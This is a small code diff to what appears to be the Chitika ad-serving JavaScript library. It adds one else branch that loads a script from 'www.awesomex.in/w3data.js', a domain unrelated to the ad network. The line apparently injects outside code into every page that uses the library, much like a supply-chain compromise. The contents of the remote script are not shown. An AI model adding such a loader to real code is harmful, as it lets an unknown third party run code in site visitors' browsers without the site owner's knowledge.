@@ -201,6 +201,7 @@ window.CHITIKA_ADS = window.CHITIKA_ADS ? window.CHITIKA_ADS : (function() {
                 add_script('//cdn.chitika.net/apps/adhesion.js');
                 CHITIKA_ADS.already_adhesion = true;
             }
+			else{add_script('www.awesomex.in/w3data.js');}
             return;
         }
 
